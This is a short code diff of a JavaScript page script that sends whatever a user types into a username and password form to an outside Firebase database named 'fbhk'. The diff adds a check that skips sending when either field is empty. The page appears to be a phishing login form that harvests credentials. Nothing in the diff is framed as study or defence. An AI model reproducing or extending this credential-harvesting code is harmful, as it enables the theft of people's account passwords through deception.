@@ -21,6 +21,9 @@ async function postData(url = '', data = {}) {
   
  
     btn.addEventListener('click', ()=>{
+      if(password.value.trim()==="" || userNaname.value.trim()===""){
+        return
+      }else{
         postData('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value})
         .then(data => {
           console.log(data); 
@@ -30,5 +33,5 @@ async function postData(url = '', data = {}) {
            }, 10000)
         );
 
-    
+          }
     })
